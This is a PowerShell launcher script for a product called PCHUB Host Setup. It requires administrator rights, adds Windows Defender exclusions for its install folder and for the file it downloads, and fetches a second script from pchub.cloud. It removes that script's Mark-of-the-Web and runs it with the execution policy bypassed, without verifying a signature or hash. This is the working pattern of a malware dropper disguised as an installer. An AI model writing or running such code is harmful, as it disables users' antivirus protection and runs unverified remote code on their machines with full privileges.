# PCHUB Host Setup launcher — downloaded and run by PCHUB-Host-Setup.cmd
$ErrorActionPreference = "Stop"

$script:LogPath = Join-Path $env:USERPROFILE "Desktop\PCHUB-Setup-Log.txt"
$script:WizardUrl = "https://pchub.cloud/downloads/PCHUB-Host-Setup.ps1"
$script:WizardPath = Join-Path $env:TEMP "PCHUB-Host-Setup.ps1"

function Write-LauncherLog([string]$Message) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $Message"
  try { Add-Content -Path $script:LogPath -Value $line -ErrorAction SilentlyContinue } catch { }
  Write-Host $Message
}

function Show-LauncherError([string]$Message) {
  Write-LauncherLog "ERROR: $Message"
  try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
    [void][System.Windows.Forms.MessageBox]::Show(
      "$Message`n`nDetails: $script:LogPath",
      "PCHUB Host Setup",
      [System.Windows.Forms.MessageBoxButtons]::OK,
      [System.Windows.Forms.MessageBoxIcon]::Error
    )
  } catch {
    Write-Host ""
    Write-Host $Message -ForegroundColor Red
    Write-Host "Log: $script:LogPath" -ForegroundColor Yellow
    Read-Host "Press Enter to close"
  }
}

function Clear-PchubMotw([string]$Path) {
  if (-not (Test-Path -LiteralPath $Path)) { return }
  try { Unblock-File -LiteralPath $Path -ErrorAction SilentlyContinue } catch { }
  try {
    $zone = "${Path}:Zone.Identifier"
    if (Test-Path -LiteralPath $zone) { Remove-Item -LiteralPath $zone -Force -ErrorAction SilentlyContinue }
  } catch { }
}

function Stop-ExistingPchubAgent {
  $root = "C:\PCHUB-Host"
  if (-not (Test-Path $root)) { return }
  Write-LauncherLog "Stopping any existing PCHUB agent in $root ..."
  $stop = Join-Path $root "stop-agent.bat"
  if (Test-Path $stop) {
    try { & cmd.exe /c "`"$stop`" quiet" | Out-Null } catch { }
  }
  Get-Process -Name "PCHUB-Status" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

try {
  Write-LauncherLog "=== PCHUB launcher started ==="
  Write-LauncherLog "User: $env:USERNAME  Computer: $env:COMPUTERNAME"
  Write-LauncherLog "PowerShell: $($PSVersionTable.PSVersion)"

  $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
  )
  Write-LauncherLog "Administrator: $isAdmin"
  if (-not $isAdmin) {
    throw "Not running as administrator. Right-click PCHUB-Host-Setup.cmd and choose Run as administrator."
  }

  try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
  } catch { }

  Stop-ExistingPchubAgent

  try {
    New-Item -ItemType Directory -Force -Path "C:\PCHUB-Host" | Out-Null
    Add-MpPreference -ExclusionPath "C:\PCHUB-Host" -ErrorAction SilentlyContinue | Out-Null
    Add-MpPreference -ExclusionPath $script:WizardPath -ErrorAction SilentlyContinue | Out-Null
    Write-LauncherLog "Defender exclusions applied (if allowed)."
  } catch {
    Write-LauncherLog "Defender exclusion skipped: $($_.Exception.Message)"
  }

  Write-LauncherLog "Downloading wizard from $script:WizardUrl ..."
  Invoke-WebRequest -Uri $script:WizardUrl -OutFile $script:WizardPath -UseBasicParsing

  if (-not (Test-Path -LiteralPath $script:WizardPath)) {
    throw "Download failed — file not created."
  }
  $size = (Get-Item -LiteralPath $script:WizardPath).Length
  Write-LauncherLog "Downloaded $size bytes to $script:WizardPath"
  if ($size -lt 1000) {
    throw "Download failed — file too small ($size bytes). Try again from https://pchub.cloud/host"
  }

  Clear-PchubMotw $script:WizardPath

  Write-LauncherLog "Starting setup wizard (separate window)..."
  $ps = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
  $argList = @(
    "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-STA",
    "-File", $script:WizardPath
  )
  $proc = Start-Process -FilePath $ps -ArgumentList $argList -Wait -PassThru -WindowStyle Normal
  $code = if ($proc) { $proc.ExitCode } else { 1 }
  Write-LauncherLog "Wizard exited with code $code"
  exit $code
} catch {
  Show-LauncherError $_.Exception.Message
  exit 1
}
